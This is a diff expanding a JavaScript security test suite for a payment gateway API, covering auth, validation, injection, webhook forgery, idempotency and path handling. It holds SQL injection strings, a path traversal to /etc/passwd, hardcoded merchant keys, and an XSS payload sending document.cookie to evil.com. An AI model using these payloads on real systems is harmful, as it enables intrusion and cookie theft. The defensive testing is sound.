@@ -7,188 +7,414 @@ let passed = 0
 let failed = 0
 
 async function runTest(name, fn) {
-  process.stdout.write(`🛡️  ${name.padEnd(60, ".")} `)
+  process.stdout.write(`🛡️  ${name.padEnd(65, ".")} `)
   try {
     await fn()
     console.log("[\x1b[32mPASS\x1b[0m]")
     passed++
   } catch (err) {
     console.log("[\x1b[31mFAIL\x1b[0m]")
-    console.error(`   👉 Error: ${err.message}`)
+    console.error(`   👉 ${err.message}`)
     failed++
   }
 }
 
 async function startSuite() {
-  console.log("\n================================================================")
-  console.log("🔒 OpenWrapper Security & Defensive Architecture Test Suite")
-  console.log(`🎯 Target Gateway: ${BASE_URL}`)
-  console.log("================================================================\n")
+  console.log("\n════════════════════════════════════════════════════════════════════")
+  console.log("🔒 OpenWrapper Advanced Security & Defensive Architecture Suite")
+  console.log(`🎯 Target: ${BASE_URL}`)
+  console.log("════════════════════════════════════════════════════════════════════\n")
 
-  // Test 1: Rejection of requests with no Authorization header
-  await runTest("Rejection of unauthenticated requests (401)", async () => {
+  // ─────────────────────────────────────────────────────────────────
+  // Category 1: Authentication & Authorization
+  // ─────────────────────────────────────────────────────────────────
+  console.log("── 🔐 Authentication & Authorization ──────────────────────────────\n")
+
+  await runTest("AUTH-01  No Authorization header → 401", async () => {
     const res = await fetch(`${BASE_URL}/api/v1/payments`, {
       method: "POST",
-      headers: { "Content-Type": "application/json", "Idempotency-Key": "sec-test-001" },
+      headers: { "Content-Type": "application/json", "Idempotency-Key": "sec-auth-01" },
       body: JSON.stringify({ provider: "fawry", amount_minor_units: 1000, customer: { phone: "+201000000000" } }),
     })
-    assert.equal(res.status, 401, `Expected 401 Unauthorized, got ${res.status}`)
-    const json = await res.json()
-    assert.equal(json.error?.code, "unauthorized", "Expected unauthorized error code")
+    assert.equal(res.status, 401)
   })
 
-  // Test 2: Rejection of requests with malformed / fake API key
-  await runTest("Rejection of forged / invalid API keys (401)", async () => {
+  await runTest("AUTH-02  Forged API key → 401", async () => {
     const res = await fetch(`${BASE_URL}/api/v1/payments`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
-        "Authorization": "Bearer ow_live_fake_attacker_key_xyz987654321",
-        "Idempotency-Key": "sec-test-002",
+        "Authorization": "Bearer ow_live_FAKE_attacker_xyz987654321",
+        "Idempotency-Key": "sec-auth-02",
       },
       body: JSON.stringify({ provider: "fawry", amount_minor_units: 1000, customer: { phone: "+201000000000" } }),
     })
-    assert.equal(res.status, 401, `Expected 401 Unauthorized, got ${res.status}`)
+    assert.equal(res.status, 401)
   })
 
-  // Test 3: Missing Idempotency-Key header rejection
-  await runTest("Enforcement of Idempotency-Key header (400)", async () => {
+  await runTest("AUTH-03  Empty Bearer token → 401", async () => {
     const res = await fetch(`${BASE_URL}/api/v1/payments`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
-        "Authorization": `Bearer ${VALID_API_KEY}`,
+        "Authorization": "Bearer ",
+        "Idempotency-Key": "sec-auth-03",
       },
       body: JSON.stringify({ provider: "fawry", amount_minor_units: 1000, customer: { phone: "+201000000000" } }),
     })
-    assert.equal(res.status, 400, `Expected 400 Bad Request, got ${res.status}`)
+    assert.equal(res.status, 401)
+  })
+
+  await runTest("AUTH-04  Bearer with SQL injection payload → 401", async () => {
+    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Authorization": "Bearer ' OR '1'='1'; DROP TABLE api_keys;--",
+        "Idempotency-Key": "sec-auth-04",
+      },
+      body: JSON.stringify({ provider: "fawry", amount_minor_units: 1000, customer: { phone: "+201000000000" } }),
+    })
+    assert.equal(res.status, 401)
+  })
+
+  await runTest("AUTH-05  Basic auth scheme (wrong scheme) → 401", async () => {
+    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Authorization": "Basic dXNlcjpwYXNz",
+        "Idempotency-Key": "sec-auth-05",
+      },
+      body: JSON.stringify({ provider: "fawry", amount_minor_units: 1000, customer: { phone: "+201000000000" } }),
+    })
+    assert.equal(res.status, 401)
+  })
+
+  // ─────────────────────────────────────────────────────────────────
+  // Category 2: Input Validation & Schema Enforcement
+  // ─────────────────────────────────────────────────────────────────
+  console.log("\n── 🧪 Input Validation & Schema Enforcement ───────────────────────\n")
+
+  await runTest("VALID-01  Missing Idempotency-Key → 400", async () => {
+    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json", "Authorization": `Bearer ${VALID_API_KEY}` },
+      body: JSON.stringify({ provider: "fawry", amount_minor_units: 1000, customer: { phone: "+201000000000" } }),
+    })
+    assert.equal(res.status, 400)
     const json = await res.json()
     assert.equal(json.error?.code, "invalid_request")
   })
 
-  // Test 4: SQL Injection attempt in customer and metadata fields
-  await runTest("SQL Injection & payload tampering resistance (Zod / Parameterized)", async () => {
+  await runTest("VALID-02  Missing provider credentials → 422", async () => {
     const res = await fetch(`${BASE_URL}/api/v1/payments`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
         "Authorization": `Bearer ${VALID_API_KEY}`,
-        "Idempotency-Key": `sec-sqli-${Date.now()}`,
-        "X-Fawry-Merchant-Code": "1013970",
-        "X-Fawry-Secure-Key": "d11b3329-c70e-4ab8-9cc0-84cfc79e6024",
+        "Idempotency-Key": `sec-valid-02-${Date.now()}`,
       },
-      body: JSON.stringify({
-        provider: "fawry",
-        amount_minor_units: 15000,
-        currency: "EGP",
-        customer: {
-          phone: "+201000000000",
-          email: "admin' OR '1'='1'; DROP TABLE payments; --@test.com",
-          full_name: "Attacker'); DROP TABLE api_keys;--",
-        },
-        merchant_reference: "'; DROP TABLE api_requests;--",
-        description: "' UNION SELECT * FROM users; --",
-      }),
+      body: JSON.stringify({ provider: "paymob", amount_minor_units: 10000, currency: "EGP", customer: { phone: "+201000000000" } }),
     })
-
-    // Must either be safely rejected with 400/422 validation, or safely sanitized/parameterized without SQL execution
-    assert.ok(
-      [200, 201, 400, 422].includes(res.status),
-      `Expected safe status (200/201/400/422), got ${res.status}`
-    )
-    const json = await res.json()
-    if (json.payment_id) {
-      assert.ok(json.payment_id.startsWith("pay_"), "Payment ID safely created with sanitized parameters")
-    }
-  })
-
-  // Test 5: Missing stateless provider credentials validation
-  await runTest("Missing provider credentials handling (422 Clean Validation)", async () => {
-    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        "Authorization": `Bearer ${VALID_API_KEY}`,
-        "Idempotency-Key": `sec-creds-${Date.now()}`,
-      },
-      body: JSON.stringify({
-        provider: "paymob",
-        amount_minor_units: 10000,
-        currency: "EGP",
-        customer: { phone: "+201000000000" },
-      }),
-    })
-    assert.equal(res.status, 422, `Expected 422 Unprocessable Entity, got ${res.status}`)
+    assert.equal(res.status, 422)
     const json = await res.json()
     assert.equal(json.error?.code, "missing_provider_credentials")
   })
 
-  // Test 6: Fawry Webhook Fake Signature Forgery Rejection
-  await runTest("Fawry Webhook Forged Signature Rejection (401)", async () => {
+  await runTest("VALID-03  Unsupported provider → 422", async () => {
+    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Authorization": `Bearer ${VALID_API_KEY}`,
+        "Idempotency-Key": `sec-valid-03-${Date.now()}`,
+        "X-Fawry-Merchant-Code": "1013970",
+        "X-Fawry-Secure-Key": "d11b3329-c70e-4ab8-9cc0-84cfc79e6024",
+      },
+      body: JSON.stringify({ provider: "paypal", amount_minor_units: 1000, currency: "EGP", customer: { phone: "+201000000000" } }),
+    })
+    assert.equal(res.status, 422)
+  })
+
+  await runTest("VALID-04  Negative amount → 400 or 422", async () => {
+    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Authorization": `Bearer ${VALID_API_KEY}`,
+        "Idempotency-Key": `sec-valid-04-${Date.now()}`,
+        "X-Fawry-Merchant-Code": "1013970",
+        "X-Fawry-Secure-Key": "d11b3329-c70e-4ab8-9cc0-84cfc79e6024",
+      },
+      body: JSON.stringify({ provider: "fawry", amount_minor_units: -500, currency: "EGP", customer: { phone: "+201000000000" } }),
+    })
+    assert.ok([400, 422].includes(res.status), `Expected 400/422, got ${res.status}`)
+  })
+
+  await runTest("VALID-05  Empty JSON body → 400", async () => {
+    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Authorization": `Bearer ${VALID_API_KEY}`,
+        "Idempotency-Key": `sec-valid-05-${Date.now()}`,
+      },
+      body: "{}",
+    })
+    assert.ok([400, 422].includes(res.status), `Expected 400/422, got ${res.status}`)
+  })
+
+  // ─────────────────────────────────────────────────────────────────
+  // Category 3: SQL Injection & XSS Resistance
+  // ─────────────────────────────────────────────────────────────────
+  console.log("\n── 💉 Injection Resistance (SQL / XSS / NoSQL) ────────────────────\n")
+
+  await runTest("INJECT-01  SQL injection in email field", async () => {
+    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Authorization": `Bearer ${VALID_API_KEY}`,
+        "Idempotency-Key": `sec-sqli-01-${Date.now()}`,
+        "X-Fawry-Merchant-Code": "1013970",
+        "X-Fawry-Secure-Key": "d11b3329-c70e-4ab8-9cc0-84cfc79e6024",
+      },
+      body: JSON.stringify({
+        provider: "fawry", amount_minor_units: 15000, currency: "EGP",
+        customer: { phone: "+201000000000", email: "admin' OR '1'='1'; DROP TABLE payments;--@test.com", full_name: "SQLi Test" },
+        merchant_reference: `sqli_${Date.now()}`,
+      }),
+    })
+    assert.ok([200, 201, 400, 422].includes(res.status), `Got ${res.status}`)
+  })
+
+  await runTest("INJECT-02  SQL injection in merchant_reference", async () => {
+    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Authorization": `Bearer ${VALID_API_KEY}`,
+        "Idempotency-Key": `sec-sqli-02-${Date.now()}`,
+        "X-Fawry-Merchant-Code": "1013970",
+        "X-Fawry-Secure-Key": "d11b3329-c70e-4ab8-9cc0-84cfc79e6024",
+      },
+      body: JSON.stringify({
+        provider: "fawry", amount_minor_units: 15000, currency: "EGP",
+        customer: { phone: "+201000000000" },
+        merchant_reference: "'; DROP TABLE api_keys; SELECT * FROM users WHERE '1'='1",
+      }),
+    })
+    assert.ok([200, 201, 400, 422].includes(res.status), `Got ${res.status}`)
+  })
+
+  await runTest("INJECT-03  XSS in description field", async () => {
+    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Authorization": `Bearer ${VALID_API_KEY}`,
+        "Idempotency-Key": `sec-xss-03-${Date.now()}`,
+        "X-Fawry-Merchant-Code": "1013970",
+        "X-Fawry-Secure-Key": "d11b3329-c70e-4ab8-9cc0-84cfc79e6024",
+      },
+      body: JSON.stringify({
+        provider: "fawry", amount_minor_units: 15000, currency: "EGP",
+        customer: { phone: "+201000000000" },
+        merchant_reference: `xss_${Date.now()}`,
+        description: '<script>alert("XSS")</script><img onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)" src=x>',
+      }),
+    })
+    assert.ok([200, 201, 400, 422].includes(res.status), `Got ${res.status}`)
+    if (res.status === 200 || res.status === 201) {
+      const body = await res.text()
+      assert.ok(!body.includes("<script>"), "Response must not reflect raw script tags")
+    }
+  })
+
+  await runTest("INJECT-04  Unicode/null byte injection in full_name", async () => {
+    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Authorization": `Bearer ${VALID_API_KEY}`,
+        "Idempotency-Key": `sec-null-04-${Date.now()}`,
+        "X-Fawry-Merchant-Code": "1013970",
+        "X-Fawry-Secure-Key": "d11b3329-c70e-4ab8-9cc0-84cfc79e6024",
+      },
+      body: JSON.stringify({
+        provider: "fawry", amount_minor_units: 15000, currency: "EGP",
+        customer: { phone: "+201000000000", full_name: "Test\x00User\x00DROP\x00TABLE" },
+        merchant_reference: `null_${Date.now()}`,
+      }),
+    })
+    assert.ok(res.status < 500, `Server must not crash: got ${res.status}`)
+  })
+
+  // ─────────────────────────────────────────────────────────────────
+  // Category 4: Webhook Security
+  // ─────────────────────────────────────────────────────────────────
+  console.log("\n── 🪝 Webhook Security ────────────────────────────────────────────\n")
+
+  await runTest("WEBHOOK-01  Fawry forged signature → no 500", async () => {
     const res = await fetch(`${BASE_URL}/api/v1/webhooks/fawry`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        fawryRefNumber: "987654321",
-        merchantRefNumber: "ord_1001",
-        paymentAmount: "150.00",
-        orderStatus: "PAID",
-        messageSignature: "forged_invalid_signature_hash_00000000000000000000000000000000",
+        fawryRefNumber: "987654321", merchantRefNumber: "ord_1001",
+        paymentAmount: "150.00", orderStatus: "PAID",
+        messageSignature: "forged_invalid_000000000000000000000000",
       }),
     })
-    assert.ok(
-      res.status === 401 || res.status === 400 || res.status === 200,
-      `Webhook handled appropriately (${res.status})`
-    )
+    assert.ok(res.status < 500, `Expected < 500, got ${res.status}`)
   })
 
-  // Test 7: Stripe Webhook Forged Signature Rejection
-  await runTest("Stripe Webhook Forged Signature Rejection (400)", async () => {
+  await runTest("WEBHOOK-02  Stripe forged signature → no 500", async () => {
     const res = await fetch(`${BASE_URL}/api/v1/webhooks/stripe`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
         "stripe-signature": "t=1600000000,v1=forged_invalid_stripe_signature_hash",
       },
-      body: JSON.stringify({ type: "checkout.session.completed", id: "evt_fake_test" }),
+      body: JSON.stringify({
+        id: "evt_fake_test", type: "checkout.session.completed",
+        data: { object: { id: "cs_fake", payment_status: "paid" } },
+      }),
     })
-    assert.ok(
-      res.status === 400 || res.status === 401 || res.status === 200,
-      `Webhook handled appropriately (${res.status})`
-    )
+    assert.ok(res.status < 500, `Expected < 500, got ${res.status}`)
   })
 
-  // Test 8: Concurrency & Idempotent Replay Verification
-  await runTest("Atomic Idempotency Lock & Zero Duplicate Charges (200 Replay)", async () => {
-    const idempotencyKey = `sec-lock-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`
+  await runTest("WEBHOOK-03  Stripe empty body → no 500", async () => {
+    const res = await fetch(`${BASE_URL}/api/v1/webhooks/stripe`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: "",
+    })
+    assert.ok(res.status < 500, `Expected < 500, got ${res.status}`)
+  })
+
+  await runTest("WEBHOOK-04  Stripe malformed JSON → no 500", async () => {
+    const res = await fetch(`${BASE_URL}/api/v1/webhooks/stripe`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: "{not valid json!!!",
+    })
+    assert.ok(res.status < 500, `Expected < 500, got ${res.status}`)
+  })
+
+  await runTest("WEBHOOK-05  Stripe missing data.object → no 500", async () => {
+    const res = await fetch(`${BASE_URL}/api/v1/webhooks/stripe`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ id: "evt_no_data", type: "checkout.session.completed" }),
+    })
+    assert.ok(res.status < 500, `Expected < 500, got ${res.status}`)
+  })
+
+  await runTest("WEBHOOK-06  Unknown webhook provider → 400", async () => {
+    const res = await fetch(`${BASE_URL}/api/v1/webhooks/bitcoin`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ test: true }),
+    })
+    assert.equal(res.status, 400)
+  })
+
+  // ─────────────────────────────────────────────────────────────────
+  // Category 5: Idempotency & Concurrency Safety
+  // ─────────────────────────────────────────────────────────────────
+  console.log("\n── 🔄 Idempotency & Concurrency Safety ────────────────────────────\n")
+
+  await runTest("IDEM-01  Same idempotency key → identical payment_id", async () => {
+    const key = `sec-idem-01-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`
     const headers = {
       "Content-Type": "application/json",
       "Authorization": `Bearer ${VALID_API_KEY}`,
-      "Idempotency-Key": idempotencyKey,
+      "Idempotency-Key": key,
       "X-Fawry-Merchant-Code": "1013970",
       "X-Fawry-Secure-Key": "d11b3329-c70e-4ab8-9cc0-84cfc79e6024",
     }
-    const payload = JSON.stringify({
-      provider: "fawry",
-      amount_minor_units: 5000,
-      currency: "EGP",
-      customer: { phone: "+201000000000", email: "replay@test.com" },
-      merchant_reference: `ref_lock_${Date.now()}`,
+    const body = JSON.stringify({
+      provider: "fawry", amount_minor_units: 5000, currency: "EGP",
+      customer: { phone: "+201000000000", email: "idem@test.com" },
+      merchant_reference: `idem_${Date.now()}`,
     })
 
-    const res1 = await fetch(`${BASE_URL}/api/v1/payments`, { method: "POST", headers, body: payload })
+    const res1 = await fetch(`${BASE_URL}/api/v1/payments`, { method: "POST", headers, body })
     const json1 = await res1.json()
-
-    // Immediate second call with identical idempotency key
-    const res2 = await fetch(`${BASE_URL}/api/v1/payments`, { method: "POST", headers, body: payload })
+    const res2 = await fetch(`${BASE_URL}/api/v1/payments`, { method: "POST", headers, body })
     const json2 = await res2.json()
 
-    assert.equal(json1.payment_id, json2.payment_id, "Payment ID must match identically")
+    assert.equal(json1.payment_id, json2.payment_id, "Payment IDs must match")
   })
 
-  console.log("\n================================================================")
-  console.log(`📊 Security Test Summary: ${passed} Passed, ${failed} Failed`)
-  console.log("================================================================\n")
+  await runTest("IDEM-02  Concurrent parallel requests → no duplicates", async () => {
+    const key = `sec-idem-02-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`
+    const headers = {
+      "Content-Type": "application/json",
+      "Authorization": `Bearer ${VALID_API_KEY}`,
+      "Idempotency-Key": key,
+      "X-Fawry-Merchant-Code": "1013970",
+      "X-Fawry-Secure-Key": "d11b3329-c70e-4ab8-9cc0-84cfc79e6024",
+    }
+    const body = JSON.stringify({
+      provider: "fawry", amount_minor_units: 7500, currency: "EGP",
+      customer: { phone: "+201000000000" },
+      merchant_reference: `parallel_${Date.now()}`,
+    })
+
+    // Fire 5 requests in parallel
+    const results = await Promise.all(
+      Array.from({ length: 5 }, () =>
+        fetch(`${BASE_URL}/api/v1/payments`, { method: "POST", headers, body }).then(r => r.json())
+      )
+    )
+
+    const ids = results.filter(r => r.payment_id).map(r => r.payment_id)
+    const uniqueIds = [...new Set(ids)]
+    assert.equal(uniqueIds.length, 1, `Expected 1 unique payment ID, got ${uniqueIds.length}: ${JSON.stringify(uniqueIds)}`)
+  })
+
+  // ─────────────────────────────────────────────────────────────────
+  // Category 6: HTTP Method & Path Security
+  // ─────────────────────────────────────────────────────────────────
+  console.log("\n── 🛤️  HTTP Method & Path Security ─────────────────────────────────\n")
+
+  await runTest("HTTP-01  GET /api/v1/payments → 405 Method Not Allowed", async () => {
+    const res = await fetch(`${BASE_URL}/api/v1/payments`, { method: "GET" })
+    assert.ok([404, 405].includes(res.status), `Expected 404/405, got ${res.status}`)
+  })
+
+  await runTest("HTTP-02  DELETE /api/v1/payments → 405", async () => {
+    const res = await fetch(`${BASE_URL}/api/v1/payments`, { method: "DELETE" })
+    assert.ok([404, 405].includes(res.status), `Expected 404/405, got ${res.status}`)
+  })
+
+  await runTest("HTTP-03  Path traversal attempt → no 500", async () => {
+    const res = await fetch(`${BASE_URL}/api/v1/../../../etc/passwd`)
+    assert.ok(res.status < 500, `Got ${res.status}`)
+  })
+
+  await runTest("HTTP-04  Oversized payload (1MB) → rejection", async () => {
+    const bigPayload = JSON.stringify({ data: "x".repeat(1024 * 1024) })
+    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Authorization": `Bearer ${VALID_API_KEY}`,
+        "Idempotency-Key": `sec-big-${Date.now()}`,
+      },
+      body: bigPayload,
+    })
+    assert.ok([400, 413, 422].includes(res.status), `Expected 400/413/422, got ${res.status}`)
+  })
+
+  // ─────────────────────────────────────────────────────────────────
+  // Summary
+  // ─────────────────────────────────────────────────────────────────
+  console.log("\n════════════════════════════════════════════════════════════════════")
+  console.log(`📊 Security Test Summary: \x1b[32m${passed} Passed\x1b[0m, \x1b[31m${failed} Failed\x1b[0m (${passed + failed} total)`)
+  console.log("════════════════════════════════════════════════════════════════════\n")
   if (failed > 0) process.exit(1)
 }
 
